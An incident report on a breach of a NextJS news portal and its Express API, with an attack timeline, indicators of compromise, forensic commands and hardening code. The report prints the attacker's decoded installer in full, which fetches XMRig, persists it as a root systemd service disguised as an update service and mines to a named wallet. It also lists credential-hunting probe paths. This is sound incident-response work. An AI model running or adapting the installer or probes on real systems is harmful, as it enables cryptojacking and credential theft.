# Security Incident Report - December 9, 2025

## Executive Summary

On December 9, 2025, the NewsNexus infrastructure experienced a **critical security breach** involving both the NewsNexus10Portal (NextJS application) and NewsNexus10API (Express.js application). The attackers successfully achieved:

1. **Remote Code Execution (RCE)** on the Portal application
2. **Data Exfiltration** of environment variables containing sensitive configuration
3. **Attempted Cryptocurrency Mining Malware Installation** with systemd persistence
4. **Comprehensive Automated Reconnaissance** across both applications

This incident represents an **escalation from the December 8 breach**, demonstrating more sophisticated attack techniques, successful data exfiltration, and organized threat actor behavior.

**Severity: CRITICAL**

**Impact:** Remote Code Execution, Data Exfiltration, Unauthorized Reconnaissance, Attempted Persistent Malware Installation

**Status:** Investigation Complete - IMMEDIATE ACTION REQUIRED

---

## Timeline of Attack

### Phase 1: Initial Exploitation (04:54 - 05:23 UTC)

#### 04:54 UTC - First Contact
**Portal Error Log Line 1-3:**
```
TypeError: Cannot read properties of undefined (reading 'z')
```

**Analysis:** Initial probing attack testing application error handling and response structure.

#### 04:58 UTC - Database Import Operation
**API Output Log Lines 23-36:**

Legitimate database import operation completed successfully, importing 1,710,298 records. This indicates the system was in active use when the attack commenced.

#### 05:02-05:24 UTC - Extensive Reconnaissance Phase
**API Output Log Lines 71-323:**

The attacker initiated a comprehensive automated scan searching for sensitive files and credentials:

**Environment Files (.env):**
- `/.env` (line 88)
- `/portal/.env`, `/env/.env`, `/api/.env`, `/app/.env`, `/dev/.env`, `/new/.env` (lines 91-96)
- `/new/.env.local`, `/new/.env.production`, `/new/.env.staging` (lines 98-101)
- Plus 50+ additional .env variations across different directory structures

**Configuration Files:**
- `/phpinfo.php`, `/info.php`, `/test.php` (PHP info disclosure)
- `/wp-config.php` (WordPress configuration)
- `/config.json`, `/config.js`, `/server.js`, `/main.js`, `/app.js`
- `/settings.py`, `/application.properties`
- `/.aws/credentials`, `/aws-secret.yaml`, `/aws.yml`

**Version Control:**
- `/.git/config` (lines 364, 380) - CRITICAL: Git repository exposure attempt

**Stripe Payment Processing Credentials:**
- Lines 252-322: Systematic search for Stripe API keys across 70+ possible locations
- `/config/stripe.js`, `/config/stripe.php`, `/api/stripe.js`
- `/secrets/stripe.json`, `/private/stripe/api_keys.json`
- Backup files: `/backup/.env.2023-06-01`, `/old/.env.backup`

**Impact:** This reconnaissance pattern indicates:
- Professional, automated attack toolkit
- Knowledge of common application architectures
- Targeting of payment processing credentials
- Systematic approach suggesting organized threat actor

### Phase 2: Remote Code Execution (06:05 UTC)

#### 06:05 UTC - Command Injection - Reconnaissance Attempt
**Portal Error Log Lines 5-13:**
```
Error: Command failed: ipconfig /all 2>&1
/bin/sh: 1: ipconfig: not found
```

**Analysis:**
- Attacker executed `ipconfig /all` (Windows command)
- Command injection successful, but wrong OS targeted
- Demonstrates RCE capability on the Portal application
- Attacker testing environment characteristics

### Phase 3: Cryptocurrency Mining Malware Deployment (06:51 UTC)

#### 06:51 UTC - Advanced Malware Installation Attempt
**Portal Error Log Lines 17-38:**

The attacker executed a sophisticated base64-encoded bash script to install XMRig cryptocurrency miner. Decoded payload reveals:

```bash
#!/bin/bash

# Configuration
OUT="next.tar.gz"
EXTRACT_DIR="xmrig-6.24.0"
BINARY_PATH="$(pwd)/$EXTRACT_DIR/xmrig"
ARGS="--url auto.c3pool.org:80 --user 49pYi8efZGnFZWuFxgxQJ4iZZjGx8TryNfEZ9S9YSHUs1rNBWTKRaMnYKKuvUABHV5W41f4pk6z7j3AuFW9qFnFkEo3V1cw --pass node --donate-level 0 "
SERVICE_NAME="systems-updates-service"
URL="https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz"

# Download using Node.js https module
node - <<EOF
const https = require('https');
const fs = require('fs');

const file = fs.createWriteStream("${OUT}");
https.get("${URL}", (res) => {
res.pipe(file);
res.on("end", () => file.close());
});
EOF

tar xvzf "$OUT"
chmod +x "$BINARY_PATH"

# Attempt systemd setup
INSTALLED_SYSTEMD=0
if [ "$(id -u)" -eq 0 ] && command -v systemctl >/dev/null 2>&1; then
    echo "Root privileges detected. Attempting systemd setup..."

    SERVICE_FILE="/etc/systemd/system/${SERVICE_NAME}.service"

    cat <<EOF > "$SERVICE_FILE"
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${BINARY_PATH} ${ARGS}
Restart=always
RestartSec=10
User=root

[Install]
WantedBy=multi-user.target
EOF

    systemctl daemon-reload
    systemctl enable "$SERVICE_NAME"
    systemctl start "$SERVICE_NAME"

    if systemctl is-active --quiet "$SERVICE_NAME"; then
        echo "Service started via systemd."
        INSTALLED_SYSTEMD=1
    fi
fi

# Fallback to nohup
if [ $INSTALLED_SYSTEMD -eq 0 ]; then
    echo "Starting with nohup..."
    nohup "$BINARY_PATH" $ARGS >/dev/null 2>&1 &
fi
```

**Malware Characteristics:**

1. **Binary:** XMRig v6.24.0 (legitimate Monero mining software)
2. **Mining Pool:** `auto.c3pool.org:80`
3. **Wallet Address:** `49pYi8efZGnFZWuFxgxQJ4iZZjGx8TryNfEZ9S9YSHUs1rNBWTKRaMnYKKuvUABHV5W41f4pk6z7j3AuFW9qFnFkEo3V1cw`
4. **Persistence Mechanism:**
   - Primary: systemd service named `systems-updates-service` (disguised as legitimate system service)
   - Fallback: nohup background process
5. **Working Directory:** `/home/nick/applications/NewsNexus10Portal/`
6. **Clever Download Method:** Uses Node.js `https` module instead of curl/wget (leveraging existing environment)

**Attack Sophistication:**
- Multi-layered persistence (systemd + nohup fallback)
- Service name disguised as system update mechanism
- Automatic restart on failure
- Uses native Node.js for download (avoids external dependencies)
- Properly escapes to root user in systemd service for maximum privileges

**Status:** Installation FAILED
- Errors: "gzip: stdin: unexpected end of file"
- Likely failed due to network restrictions, file permissions, or incomplete download

### Phase 4: Data Exfiltration - CRITICAL (09:21 UTC)

#### 09:21 UTC - Environment Variable Leakage
**Portal Error Log Lines 39-57:**

```
TypeError: Invalid character in header content ["x-action-redirect"]
    at i.setHeader (.next/server/chunks/586.js:22:6902)

[Error: NEXT_REDIRECT] {
  digest: 'NEXT_PUBLIC_API_BASE_URL=https://api.news-nexus.kineticmetrics.com\n' +
    'NEXT_PUBLIC_API_BASE_URL_DEV=https://api.news-nexus.kineticmetrics.com\n' +
    'NEXT_PUBLIC_API_BASE_URL_WORKSTATION=http://localhost:3000\n' +
    'NEXT_PUBLIC_APP_NAME=NewsNexus\n' +
    'NEXT_PUBLIC_MODE=production'
}
```

**⚠️ CRITICAL FINDING - SUCCESSFUL DATA EXFILTRATION**

The attacker successfully exfiltrated environment variables through a NextJS error response. The `digest` field contained:

**Exfiltrated Data:**
- `NEXT_PUBLIC_API_BASE_URL=https://api.news-nexus.kineticmetrics.com`
- `NEXT_PUBLIC_API_BASE_URL_DEV=https://api.news-nexus.kineticmetrics.com`
- `NEXT_PUBLIC_API_BASE_URL_WORKSTATION=http://localhost:3000`
- `NEXT_PUBLIC_APP_NAME=NewsNexus`
- `NEXT_PUBLIC_MODE=production`

**Attack Vector Analysis:**
This appears to be exploitation of NextJS's error handling mechanism where:
1. Attacker manipulates Server Action redirect() or error handling
2. Injects malicious input that causes error with environment variables in stack trace
3. NextJS includes error context (including env vars) in error digest
4. Error response sent to client exposes configuration

**Impact:**
- Infrastructure topology revealed (API endpoints)
- Development vs production endpoints disclosed
- Application name and mode exposed
- Potential for further targeted attacks using this information

### Phase 5: Continued Automated Scanning (Throughout Day)

#### Multiple Timeframes
The API logs show continuous probing throughout the day:

**Common Vulnerability Patterns:**
- Lines 76-77: Symfony profiler exposure attempts
- Line 364, 380: Git repository configuration
- Line 367: GeoServer admin interface
- Line 396-400: Global Protect VPN/Autodiscover (network infrastructure recon)
- Line 439: Version disclosure endpoint

**Normal vs. Malicious Traffic:**
Interestingly, legitimate user activity continued throughout the attack:
- Lines 330-492: Legitimate article approval and review activities
- Users approving articles, toggling relevance flags, managing states
- Normal application functionality remained operational during the breach

---

## Attack Vector Analysis

### Primary Vulnerability: NextJS Server Actions / Error Handling

The attack exploited multiple vulnerabilities in the NewsNexus10Portal NextJS application:

#### 1. Remote Code Execution (RCE)
**Evidence:**
- Successful execution of `ipconfig /all` command
- Successful execution of complex base64-encoded bash script
- Node.js code execution capability

**Likely Attack Vectors:**
- **NextJS Server Actions Injection:** Unsanitized input passed to Server Actions
- **Prototype Pollution:** Manipulation of JavaScript object properties leading to code execution
- **Template Injection:** User input evaluated as code in templates or error handlers
- **Child Process Injection:** Direct command execution through Node.js child_process

#### 2. Environment Variable Disclosure
**Mechanism:**
The NEXT_REDIRECT error's digest field contained environment variables, suggesting:

```typescript
// Vulnerable pattern (hypothetical):
export async function serverAction(formData) {
  try {
    const userInput = formData.get('field');
    redirect(userInput); // Unsanitized redirect
  } catch (error) {
    // Error handling includes environment context
    throw new Error('NEXT_REDIRECT', {
      digest: process.env // Environment leaked in error context
    });
  }
}
```

**Root Cause:**
- Error messages include sensitive context for debugging
- Environment variables accessible in error stack traces
- NextJS error serialization exposes internal state
- No sanitization of error responses before sending to client

#### 3. Header Manipulation
**Evidence:**
```
TypeError: Invalid character in header content ["x-action-redirect"]
```

**Attack Pattern:**
- Injection of newline characters (\n, \r) in header values
- HTTP Response Splitting potential
- CRLF injection leading to header manipulation
- Bypassing security controls through malformed headers

### Secondary Target: API Reconnaissance

While the main exploitation occurred on the Portal, the API was extensively probed:

#### Automated Scanning Characteristics
**Pattern Analysis:**
- Sequential, systematic file path enumeration
- Framework-specific paths (Laravel, Symfony, Django, Rails)
- Cloud provider credential files (AWS, Azure)
- Payment processor credentials (Stripe)
- Version control exposure (.git)

**Attacker Toolkit:**
This pattern matches known automated scanners:
- **Nuclei** - Vulnerability scanner
- **ffuf/dirsearch** - Directory/file brute forcing
- **GitHacker** - Git repository disclosure
- Custom credential harvesting scripts

**All Scanned Endpoints Returned 404:**
The Express.js API correctly returned 404 for all unauthorized paths, preventing information disclosure. However, this demonstrates:
- Attacker knew the API endpoint
- Systematic approach to finding vulnerabilities
- Professional-grade reconnaissance tools

---

## Comparative Analysis: December 8 vs December 9

### Attack Evolution

| Aspect | December 8 | December 9 | Escalation |
|--------|------------|------------|------------|
| **Entry Point** | NextJS Portal | NextJS Portal | Same |
| **RCE Success** | Attempted | ✅ Confirmed | Improved |
| **Data Exfiltration** | None | ✅ Env Variables | Major escalation |
| **Malware Sophistication** | Basic c3pool script | Systemd persistence | Significantly more advanced |
| **Wallet Address** | `85RhdwGyM...` | `49pYi8efZ...` | Different actor or campaign |
| **Reconnaissance** | Limited | ✅ Extensive (300+ paths) | Organized, automated |
| **API Targeted** | No | ✅ Yes | Expanded scope |
| **Filesystem Scanning** | Yes | No (command execution instead) | Different technique |
| **Download Method** | curl pipe bash | Node.js https module | More sophisticated |
| **Persistence** | Attempted | Systemd + nohup fallback | Advanced |

### Key Differences

**December 8 Characteristics:**
- Opportunistic attack
- Single malware deployment attempt
- Simple persistence via ping command abuse
- Failed execution
- Limited reconnaissance

**December 9 Characteristics:**
- Organized, multi-phase attack
- Data exfiltration achieved
- Sophisticated persistence mechanisms
- Professional reconnaissance
- Multiple attack vectors
- Continued presence throughout the day

**Conclusion:** December 9 represents either:
1. Same attacker with refined techniques
2. Different, more sophisticated threat actor
3. Automated attack tool with broader capabilities

---

## Vulnerabilities Identified

### NewsNexus10Portal (NextJS) - CRITICAL VULNERABILITIES

#### 1. Remote Code Execution (CRITICAL)
**Location:** Unknown Server Action or API route
**Evidence:** Lines 5-13 (ipconfig), Lines 17-38 (malware script)

**Vulnerable Code Pattern:**
```javascript
// Hypothetical vulnerable pattern
import { exec } from 'child_process';

export async function serverAction(formData) {
  const command = formData.get('command');
  exec(command); // UNSAFE - direct command execution
}
```

**Impact:**
- Arbitrary command execution as application user
- Full server compromise potential
- Malware installation capability
- Data access and exfiltration

**Exploitation Difficulty:** Medium (requires finding vulnerable endpoint)

#### 2. Environment Variable Disclosure (CRITICAL)
**Location:** NextJS error handling / NEXT_REDIRECT mechanism
**Evidence:** Lines 51-57

**Vulnerable Code Pattern:**
```javascript
export async function action(formData) {
  const url = formData.get('url');
  redirect(url); // Unsanitized redirect causes error with env in digest
}
```

**Impact:**
- Configuration disclosure
- Infrastructure mapping
- Credential exposure risk (if sensitive keys in NEXT_PUBLIC_ vars)
- Facilitates targeted attacks

**Exploitation Difficulty:** Low (error responses exposed to client)

#### 3. Insufficient Input Validation (HIGH)
**Evidence:** All exploitation vectors

**Missing Controls:**
- No input sanitization on Server Actions
- No command injection prevention
- No header validation
- No path traversal protection

#### 4. Debug Information in Production (HIGH)
**Evidence:** Detailed error messages in logs

**Issues:**
- Stack traces exposed
- Environment variables in error context
- File paths disclosed
- Internal structure revealed

### NewsNexus10API (Express.js) - MEDIUM VULNERABILITIES

#### 1. Information Disclosure Through Error Responses (MEDIUM)
**Location:** `src/routes/articles.js:744`
**Evidence:** API Error Log Lines 1-2

```javascript
TypeError: Cannot read properties of null (reading 'id')
    at /home/nick/applications/NewsNexus10API/src/routes/articles.js:744:54
```

**Impact:**
- File path structure disclosed
- Line numbers revealed
- Helps attacker understand code logic

**Recommendation:** Sanitize error responses in production

#### 2. No Rate Limiting (MEDIUM)
**Evidence:** 300+ requests in reconnaissance phase accepted

**Impact:**
- Enables brute force attacks
- Allows extensive reconnaissance
- No protection against automated scanning

#### 3. Exposed API Endpoint (LOW)
**Evidence:** Extensive 404 responses indicate API is publicly accessible

**Issue:**
- API bound to 0.0.0.0:8001 (all interfaces)
- Should be accessed only through reverse proxy
- Direct access increases attack surface

### Infrastructure Vulnerabilities

#### 1. No Web Application Firewall (CRITICAL)
**Evidence:** All malicious requests reached applications

**Impact:**
- No protection against common attacks
- No rate limiting at network edge
- No pattern-based blocking
- SQL injection, XSS, RCE attempts not filtered

#### 2. No Intrusion Detection/Prevention (CRITICAL)
**Evidence:** Attack continued undetected

**Impact:**
- Attacks not identified in real-time
- No automatic blocking of malicious IPs
- No alerting on suspicious patterns

#### 3. Insufficient Logging (HIGH)
**Evidence:** Limited security event context

**Missing:**
- IP address logging in application logs
- User agent strings
- Request body content (for forensics)
- Correlation IDs between Portal and API

---

## Data Compromise Assessment

### Confirmed Exfiltration

**Environment Variables (NextJS Portal):**
```
NEXT_PUBLIC_API_BASE_URL=https://api.news-nexus.kineticmetrics.com
NEXT_PUBLIC_API_BASE_URL_DEV=https://api.news-nexus.kineticmetrics.com
NEXT_PUBLIC_API_BASE_URL_WORKSTATION=http://localhost:3000
NEXT_PUBLIC_APP_NAME=NewsNexus
NEXT_PUBLIC_MODE=production
```

**Sensitivity Assessment:**
- ✅ Publicly accessible information (NEXT_PUBLIC_ prefix indicates client-side exposure)
- Infrastructure topology revealed
- No immediate credential exposure
- However: enables targeted follow-up attacks

### Potential Compromised Data

**If .env file accessed (no direct evidence, but attempted):**

From previous analysis, the Portal's .env likely contains:
- API endpoint configurations
- Authentication tokens
- Third-party API keys
- Database connection strings
- Session secrets

**Risk:** HIGH - Reconnaissance suggests attacker was specifically seeking these files

### Database Access Assessment

**Evidence Analysis:**
- No database queries in error logs suggest direct DB access
- API endpoints require authentication
- Normal user activity continued (suggesting no mass data extraction)

**Conclusion:** No evidence of database compromise, but RCE capability means it was possible

---

## Indicators of Compromise (IOCs)

### Network IOCs

**Malicious Domains:**
- `download.c3pool.org` - Mining pool
- `auto.c3pool.org` - Mining pool connection endpoint
- `requestrepo.com` - Command & control domain
  - Specifically: `0ql6uqw4.requestrepo.com`
- `github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz`

**Mining Pool Ports:**
- Port 80 (auto.c3pool.org:80)
- Standard mining ports: 3333, 5555, 7777, 14444

**Suspicious Outbound Connections:**
- HTTPS requests to c3pool.org
- Connections to requestrepo.com
- Downloads from GitHub releases (xmrig)

### File IOCs

**Malware Files:**
- `next.tar.gz` - Downloaded XMRig archive
- `xmrig-6.24.0/` - Extracted miner directory
- `xmrig-6.24.0/xmrig` - Miner binary

**Expected Locations:**
- `/home/nick/applications/NewsNexus10Portal/next.tar.gz`
- `/home/nick/applications/NewsNexus10Portal/xmrig-6.24.0/`

**Systemd Service:**
- `/etc/systemd/system/systems-updates-service.service`

**Service Characteristics:**
```
Description=System Update Service
ExecStart=/home/nick/applications/NewsNexus10Portal/xmrig-6.24.0/xmrig
User=root
Restart=always
```

### Process IOCs

**Process Names:**
- `xmrig`
- `systems-updates-service`
- Suspicious node processes executing bash scripts

**Command Line Patterns:**
```bash
xmrig --url auto.c3pool.org:80 --user 49pYi8efZ... --pass node --donate-level 0
```

### Behavioral IOCs

**Application Level:**
- NextJS errors with environment variables in digest
- Command execution errors (ipconfig, base64, etc.)
- Rapid sequential 404 responses (reconnaissance)
- Unusual Server Action requests with command strings

**System Level:**
- High CPU usage (if miner successfully installed)
- Outbound connections to mining pools
- New systemd services with suspicious names
- Nohup processes running mining software
- File creation in application directories

### Cryptocurrency Wallet

**Monero Address:**
```
49pYi8efZGnFZWuFxgxQJ4iZZjGx8TryNfEZ9S9YSHUs1rNBWTKRaMnYKKuvUABHV5W41f4pk6z7j3AuFW9qFnFkEo3V1cw
```

**Note:** Different from December 8 attack (`85RhdwGyM...`)

### Attack Patterns

**Reconnaissance Signatures:**
- Sequential GET requests for .env files
- PHP info disclosure attempts (phpinfo, info.php)
- Git repository probing (/.git/config)
- AWS credential searches
- Stripe API key enumeration
- Framework-specific config file searches

**User Agent:** (Not captured in logs - recommendation to add)

---

## Immediate Action Items

### 🚨 CRITICAL - Within 1 Hour

#### 1. System Isolation and Forensics
```bash
# Check for running miner processes
ps aux | grep -iE "xmrig|mine|c3pool"
ps aux | grep -i "systems-updates"

# Check for malware files
find /home -name "next.tar.gz" 2>/dev/null
find /home -name "xmrig*" 2>/dev/null
find / -name "*c3pool*" 2>/dev/null

# Check for rogue systemd services
systemctl list-units --type=service | grep -iE "update|system"
cat /etc/systemd/system/systems-updates-service.service 2>/dev/null

# Check for nohup processes
ps aux | grep nohup

# Check outbound connections
netstat -tulpn | grep -E ":(80|3333|5555|7777|14444)"
lsof -i -P -n | grep -iE "xmrig|mine"

# Check for cron jobs
crontab -l -u nick
crontab -l -u root
cat /etc/cron.d/*

# Check bash history for evidence
cat /home/nick/.bash_history | grep -iE "xmrig|mine|c3pool|systemctl"
```

#### 2. Network Traffic Analysis
```bash
# Check if server is mining (outbound to c3pool)
tcpdump -i any host auto.c3pool.org -w /tmp/mining-traffic.pcap

# Check nginx access logs for attack IPs
tail -n 10000 /var/log/nginx/access.log | grep -E "(\.env|phpinfo|\.git|stripe|aws)"

# Identify attacker IPs
grep -E "(04:54|05:17|06:05|06:51|09:21)" /var/log/nginx/access.log
```

#### 3. Credential Rotation - EMERGENCY
- [ ] **Rotate ALL secrets immediately:**
  - NewsNexus10API JWT_SECRET
  - NewsNexus10API OpenAI API key
  - Email credentials (ADMIN_NODEMAILER_EMAIL_PASSWORD)
  - NewsNexus10Portal environment variables
  - Database credentials
  - Any Stripe keys
  - AWS credentials
  - SSH keys
  - Session secrets

#### 4. Application Security
- [ ] **Take NewsNexus10Portal offline immediately**
- [ ] **Deploy emergency patch:**
  - Disable all Server Actions
  - Add input validation to all endpoints
  - Sanitize all error responses
  - Remove environment variables from error context

### 🔴 URGENT - Within 4 Hours

#### 5. Forensic Data Collection
```bash
# Create forensic snapshot
sudo dd if=/dev/sda of=/mnt/external/nn10prod-forensic-$(date +%Y%m%d).img bs=4M

# Collect memory dump if available
sudo cat /proc/kcore > /tmp/memory-dump.raw

# Archive all logs
tar -czf /tmp/logs-backup-$(date +%Y%m%d-%H%M).tar.gz \
  /var/log/nginx/ \
  /var/log/syslog \
  /var/log/auth.log \
  /home/nick/applications/NewsNexus10Portal/logs/ \
  /home/nick/applications/NewsNexus10API/logs/

# Preserve PM2 logs
pm2 save
pm2 logs --lines 10000 > /tmp/pm2-logs.txt
```

#### 6. User Notification
- [ ] Notify all users of potential data exposure
- [ ] Force password reset for all user accounts
- [ ] Revoke all active JWT tokens
- [ ] Monitor for unauthorized access attempts

#### 7. Database Audit
```bash
# Check for unauthorized database modifications
sqlite3 /path/to/newsnexus10.db "SELECT * FROM User ORDER BY updatedAt DESC LIMIT 50;"

# Check for new admin users
sqlite3 /path/to/newsnexus10.db "SELECT * FROM User WHERE role='admin';"

# Export database for forensic analysis
sqlite3 /path/to/newsnexus10.db .dump > /tmp/db-dump-forensic.sql
```

### ⚠️ HIGH PRIORITY - Within 24 Hours

#### 8. Deploy Emergency Security Measures
- [ ] Implement WAF on Maestro03 (ModSecurity + OWASP CRS)
- [ ] Enable fail2ban with aggressive rules
- [ ] Implement rate limiting on nginx
- [ ] Add IP-based access controls
- [ ] Deploy intrusion detection (OSSEC/Wazuh)

#### 9. Code Audit - NextJS Portal
```bash
# Search for vulnerable patterns
grep -r "exec\|spawn\|eval\|redirect\|Function" src/

# Find Server Actions
find src/ -name "*.ts" -o -name "*.js" | xargs grep -l "use server"

# Check for command execution
grep -r "child_process\|execSync\|spawnSync" src/
```

#### 10. Patch Development
Prioritize fixing:
1. Remove RCE vulnerability in Server Actions
2. Sanitize all error responses
3. Remove environment variables from error context
4. Add comprehensive input validation
5. Implement CSP headers
6. Add request signing/verification

---

## Security Recommendations

### Immediate Fixes (Deploy Within 48 Hours)

#### NextJS Portal Hardening

**1. Disable Command Execution**
```typescript
// Remove ALL usage of:
import { exec, execSync, spawn, spawnSync } from 'child_process';

// If absolutely necessary, use with strict validation:
import { exec } from 'child_process';

function executeCommand(cmd: string, args: string[]) {
  // Whitelist ONLY
  const allowedCommands = ['ls', 'cat'];
  if (!allowedCommands.includes(cmd)) {
    throw new Error('Unauthorized command');
  }

  // Sanitize arguments
  const sanitized = args.map(arg => arg.replace(/[^a-zA-Z0-9._-]/g, ''));

  // Execute safely
  return exec(`${cmd} ${sanitized.join(' ')}`);
}
```

**2. Sanitize Error Responses**
```typescript
// middleware.ts
export function middleware(request: NextRequest) {
  return NextResponse.next();
}

// app/error.tsx
'use client';

export default function Error({
  error,
  reset,
}: {
  error: Error & { digest?: string };
  reset: () => void;
}) {
  // NEVER expose digest in production
  if (process.env.NODE_ENV === 'production') {
    return <div>An error occurred. Please try again.</div>;
  }

  // In development, sanitize sensitive data
  const safeDigest = error.digest?.replace(
    /NEXT_PUBLIC_[A-Z_]+=[^\n]+/g,
    '[REDACTED]'
  );

  return <div>Error: {safeDigest}</div>;
}
```

**3. Server Action Security**
```typescript
'use server';

import { z } from 'zod';

// Define strict schemas
const articleSchema = z.object({
  title: z.string().min(1).max(200).regex(/^[a-zA-Z0-9\s\-.,!?]+$/),
  url: z.string().url(),
  state: z.enum(['CA', 'NY', 'TX', /* ... */]),
});

export async function addArticle(formData: FormData) {
  // 1. Validate ALL inputs
  const result = articleSchema.safeParse({
    title: formData.get('title'),
    url: formData.get('url'),
    state: formData.get('state'),
  });

  if (!result.success) {
    return { error: 'Invalid input' }; // Generic message
  }

  // 2. Use validated data only
  const { title, url, state } = result.data;

  // 3. Never use user input in commands, eval, or dynamic code
  try {
    const article = await db.article.create({
      data: { title, url, state },
    });
    return { success: true };
  } catch (error) {
    // 4. Log detailed errors server-side only
    console.error('[Server] Article creation failed:', error);

    // 5. Return generic error to client
    return { error: 'Failed to create article' };
  }
}
```

**4. Environment Variable Security**
```bash
# .env.local (NEVER commit to git)
# Remove all NEXT_PUBLIC_ prefixes for sensitive data
API_BASE_URL=https://api.news-nexus.kineticmetrics.com
API_SECRET_KEY=xxx

# Only expose truly public data
NEXT_PUBLIC_APP_NAME=NewsNexus
```

```typescript
// src/lib/config.ts
export const config = {
  apiUrl: process.env.API_BASE_URL, // Server-side only
  appName: process.env.NEXT_PUBLIC_APP_NAME, // Client-safe
};

// NEVER do this:
// const config = process.env; // Exposes everything!
```

**5. Security Headers**
```typescript
// next.config.js
module.exports = {
  async headers() {
    return [
      {
        source: '/:path*',
        headers: [
          {
            key: 'X-Content-Type-Options',
            value: 'nosniff',
          },
          {
            key: 'X-Frame-Options',
            value: 'DENY',
          },
          {
            key: 'X-XSS-Protection',
            value: '1; mode=block',
          },
          {
            key: 'Strict-Transport-Security',
            value: 'max-age=31536000; includeSubDomains',
          },
          {
            key: 'Content-Security-Policy',
            value: "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';",
          },
          {
            key: 'Referrer-Policy',
            value: 'strict-origin-when-cross-origin',
          },
        ],
      },
    ];
  },
};
```

**6. Rate Limiting**
```typescript
// lib/rate-limit.ts
import { Ratelimit } from '@upstash/ratelimit';
import { Redis } from '@upstash/redis';

const redis = new Redis({
  url: process.env.REDIS_URL,
  token: process.env.REDIS_TOKEN,
});

export const ratelimit = new Ratelimit({
  redis,
  limiter: Ratelimit.slidingWindow(10, '10 s'),
});

// In Server Action:
export async function serverAction() {
  const { success } = await ratelimit.limit('user-id');
  if (!success) {
    return { error: 'Rate limit exceeded' };
  }
  // Process request
}
```

#### API Security Improvements

**1. Error Response Sanitization**
```javascript
// src/app.js - Add global error handler
app.use((err, req, res, next) => {
  // Log full error server-side
  console.error('[Error]', {
    message: err.message,
    stack: err.stack,
    path: req.path,
    method: req.method,
    timestamp: new Date().toISOString(),
  });

  // Return sanitized error to client
  const statusCode = err.statusCode || 500;

  if (process.env.NODE_ENV === 'production') {
    res.status(statusCode).json({
      error: 'Internal server error',
      requestId: req.id, // For support tracking
    });
  } else {
    res.status(statusCode).json({
      error: err.message,
      // Never include stack traces in production
    });
  }
});
```

**2. Implement Rate Limiting**
```javascript
const rateLimit = require('express-rate-limit');
const RedisStore = require('rate-limit-redis');

// Global rate limiter
const globalLimiter = rateLimit({
  store: new RedisStore({
    // Redis client configuration
  }),
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 100, // limit each IP to 100 requests per windowMs
  message: 'Too many requests from this IP',
  standardHeaders: true,
  legacyHeaders: false,
});

// Strict limiter for sensitive endpoints
const authLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5, // 5 attempts per 15 minutes
  message: 'Too many login attempts',
  skipSuccessfulRequests: true,
});

app.use('/api/', globalLimiter);
app.use('/users/login', authLimiter);
```

**3. Add Request Logging**
```javascript
// src/modules/requestLogger.js
const morgan = require('morgan');
const fs = require('fs');
const path = require('path');

// Create detailed access log
const accessLogStream = fs.createWriteStream(
  path.join(__dirname, '../logs/access.log'),
  { flags: 'a' }
);

// Custom format with security info
morgan.token('user-id', (req) => req.user?.id || 'anonymous');
morgan.token('body', (req) => {
  if (req.method === 'POST' || req.method === 'PUT') {
    return JSON.stringify(req.body);
  }
  return '-';
});

const securityFormat =
  ':remote-addr - :user-id [:date[clf]] ":method :url HTTP/:http-version" :status :res[content-length] ":referrer" ":user-agent" :response-time ms - body: :body';

app.use(morgan(securityFormat, { stream: accessLogStream }));

// Also log to console in development
if (process.env.NODE_ENV !== 'production') {
  app.use(morgan('dev'));
}
```

**4. Input Validation Middleware**
```javascript
const { body, param, validationResult } = require('express-validator');

// Validation middleware
const validate = (req, res, next) => {
  const errors = validationResult(req);
  if (!errors.isEmpty()) {
    return res.status(400).json({
      error: 'Validation failed',
      details: errors.array(),
    });
  }
  next();
};

// Example usage on routes
router.post(
  '/articles/add-article',
  authenticateToken,
  [
    body('title').trim().isLength({ min: 1, max: 500 })
      .escape().matches(/^[a-zA-Z0-9\s\-.,!?]+$/),
    body('url').isURL({ protocols: ['http', 'https'] }),
    body('publishedDate').optional().isISO8601(),
    body('stateObjArray').isArray(),
  ],
  validate,
  async (req, res) => {
    // Process validated input
  }
);
```

**5. Security Headers**
```javascript
const helmet = require('helmet');

app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'"],
      scriptSrc: ["'self'"],
      imgSrc: ["'self'", 'data:', 'https:'],
    },
  },
  hsts: {
    maxAge: 31536000,
    includeSubDomains: true,
    preload: true,
  },
}));

// Additional custom headers
app.use((req, res, next) => {
  res.setHeader('X-Powered-By', 'Hidden'); // Don't advertise Express
  next();
});
```

#### Infrastructure Hardening

**1. Nginx WAF Configuration**
```nginx
# /etc/nginx/nginx.conf
load_module modules/ngx_http_modsecurity_module.so;

http {
    # ModSecurity
    modsecurity on;
    modsecurity_rules_file /etc/nginx/modsec/main.conf;

    # Rate limiting zones
    limit_req_zone $binary_remote_addr zone=api:10m rate=10r/s;
    limit_req_zone $binary_remote_addr zone=web:10m rate=30r/s;
    limit_req_zone $binary_remote_addr zone=strict:10m rate=1r/s;

    # Connection limiting
    limit_conn_zone $binary_remote_addr zone=addr:10m;

    # Security headers
    add_header X-Frame-Options "DENY" always;
    add_header X-Content-Type-Options "nosniff" always;
    add_header X-XSS-Protection "1; mode=block" always;
    add_header Strict-Transport-Security "max-age=31536000; includeSubDomains" always;

    # Hide version
    server_tokens off;

    # Request size limits
    client_max_body_size 2m;
    client_body_buffer_size 128k;
}
```

**2. API Server Configuration**
```nginx
# /etc/nginx/sites-available/api.news-nexus.kineticmetrics.com
server {
    listen 443 ssl http2;
    server_name api.news-nexus.kineticmetrics.com;

    # SSL configuration
    ssl_certificate /etc/letsencrypt/live/api.news-nexus.kineticmetrics.com/fullchain.pem;
    ssl_certificate_key /etc/letsencrypt/live/api.news-nexus.kineticmetrics.com/privkey.pem;
    ssl_protocols TLSv1.2 TLSv1.3;
    ssl_ciphers 'ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384';
    ssl_prefer_server_ciphers off;

    # Rate limiting
    limit_req zone=api burst=20 nodelay;
    limit_conn addr 10;

    # Timeouts
    client_body_timeout 10s;
